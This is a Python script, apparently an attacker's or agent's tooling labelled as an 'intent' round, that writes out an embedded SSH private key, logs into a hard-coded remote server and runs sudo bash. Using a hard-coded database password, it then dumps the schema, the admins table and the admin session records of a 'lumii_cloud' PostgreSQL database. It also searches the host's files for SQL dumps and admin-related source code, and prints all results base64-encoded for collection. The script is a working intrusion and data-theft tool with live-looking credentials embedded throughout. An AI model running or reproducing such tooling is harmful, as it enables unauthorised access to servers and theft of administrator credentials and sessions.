# -*- coding: utf-8 -*-
# intent 29581 round B: psql into lumii_cloud on share-center, dump schema/admins/sessions.
import os,sys,base64,subprocess,json,re,time
KEYB64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open("/tmp/fk","wb").write(base64.b64decode(KEYB64)); os.chmod("/tmp/fk",0o600)
def R(k,v,maxb=80000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
SCRIPT = r"""
set +e
export PGPASSWORD='b24ebdd91c1c1d160992ce8b77d838a68b2647a9612d7c6f'
PSQL="psql -h 127.0.0.1 -U lumii_cloud -d lumii_cloud -P pager=off -At"
echo "@@@VER"; which psql; psql --version; $PSQL -c 'select current_user,current_database(),version()'
echo "@@@SCHEMAS"; $PSQL -c "select nspname from pg_namespace where nspname not like 'pg_%' and nspname<>'information_schema' order by 1"
echo "@@@TABLES"; $PSQL -c "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') and table_type='BASE TABLE' order by 1"
echo "@@@COUNTS"; for t in $($PSQL -c "select table_schema||'.'||table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') and table_type='BASE TABLE' order by 1"); do c=$($PSQL -c "select count(*) from $t" 2>/dev/null); echo "$t = $c"; done
echo "@@@COLUMNS"; $PSQL -F '|' -c "select table_name,column_name,data_type,is_nullable,column_default from information_schema.columns where table_schema not in ('pg_catalog','information_schema') order by table_name,ordinal_position"
echo "@@@ADMINS"; $PSQL -F '|' -c "select * from admins limit 20" 2>&1
echo "@@@SESSIONS"; $PSQL -F '|' -c "select * from admin_sessions order by 1 desc limit 30" 2>&1
echo "@@@SQLFILES"; find /data/lumii-shared /data/lumii-cloud -name "*.sql" 2>/dev/null | grep -viE 'node_modules|/\.git/' | head -40
echo "@@@GREPSRC"; grep -rlaE "admin_sessions|super_admin" /data/lumii-shared/app 2>/dev/null | grep -viE 'node_modules|/\.git/|\.map$' | head -30
echo "@@@DONE"
"""
def run(cmd,timeout=420):
    try:
        p=subprocess.run(cmd,input=SCRIPT.encode(),capture_output=True,timeout=timeout); return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
a=["ssh","-i","/tmp/fk","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=15","-o","IdentitiesOnly=yes","ubuntu@43.143.107.214","sudo -n bash -s"]
rc,o,e=run(a,timeout=440)
R("meta",{"rc":rc,"err":e[-300:],"outlen":len(o)})
parts=re.split(r'@@@([A-Z0-9_]+)',o)
for i in range(1,len(parts),2):
    R(parts[i].lower(), parts[i+1] if i+1<len(parts) else "")
R("done",{"t":int(time.time())})
